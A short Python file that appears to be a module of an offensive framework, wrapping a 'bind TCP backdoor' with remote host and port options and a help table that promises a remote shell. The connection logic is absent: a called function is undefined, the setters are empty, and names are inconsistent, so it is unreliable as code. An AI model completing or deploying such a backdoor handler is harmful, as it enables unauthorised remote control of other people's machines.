import sys
import glob
import socket
import threading
from os import system
from netaddr import ip
from termcolor import colored
from prettytable import PrettyTable


class Py314Bind():
    """Simple Py314 Bind TCP handler"""
    
    def __init__(self):
        self.rhost = ''
        self.rport = 1234

    def get_names(self):
        return dir(self.__class__)

    def launch(self):
       
        launchModule(self.rhost, self.rport)


    def set_rhost(self):
        """Define IP address of remote host to bind"""

    def set_rport(self):
        """Define port of remote host to bind"""

    def showOptions(self):
        """Display options about PolyMolyBindTcp"""

        print("""The polymoly_bind_tcp backdoor is designed to bind a specified host with IP & port combination.""")
        print("""If the connection is successfull, a shell is automatically give, and remote actions are allowed""")

        table = PrettyTable()
        headers = ['name', 'value', 'description']
        table.field_names = headers
        for header in headers:
            table.align[header] = 'l'

        for option in self.__dict__.keys():
            optionName = option
            optionValue = self.__dict__[option]
            optionDoc = getattr(self, f"set_{option}").__doc__

            table.add_row([optionName, optionValue, optionDoc])

        print(table)

